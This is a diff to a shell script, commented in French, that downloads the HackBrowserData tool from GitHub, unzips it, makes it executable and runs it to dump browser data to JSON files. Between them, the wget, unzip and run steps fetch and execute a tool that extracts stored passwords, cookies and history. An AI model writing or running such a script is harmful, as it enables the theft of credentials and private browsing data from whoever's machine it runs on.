@@ -15,13 +15,22 @@ fi
 
 # Télécharger HackBrowserData
 echo "[+] Téléchargement de HackBrowserData..."
-wget -q --show-progress https://github.com/moonD4rk/HackBrowserData/releases/latest/download/hackbrowserdata_linux_amd64.tar.gz
-tar -xzf hackbrowserdata_linux_amd64.tar.gz
-chmod +x hackbrowserdata
+wget -q --show-progress "https://github.com/moonD4rk/HackBrowserData/releases/download/v0.4.6/hack-browser-data-linux-64bit.zip" -O hackbrowserdata.zip
+
+# Extraire l’archive
+echo "[+] Extraction..."
+unzip -o hackbrowserdata.zip
+chmod +x hack-browser-data
+
+# Vérifier si le fichier exécutable existe
+if [ ! -f "hack-browser-data" ]; then
+    echo "[!] Erreur : Fichier hack-browser-data introuvable après extraction."
+    exit 1
+fi
 
 # Exécuter HackBrowserData
 echo "[+] Extraction des données..."
-./hackbrowserdata -o json
+./hack-browser-data -o json
 
 # Vérifier si des fichiers JSON ont été créés
 if ls *.json 1> /dev/null 2>&1; then
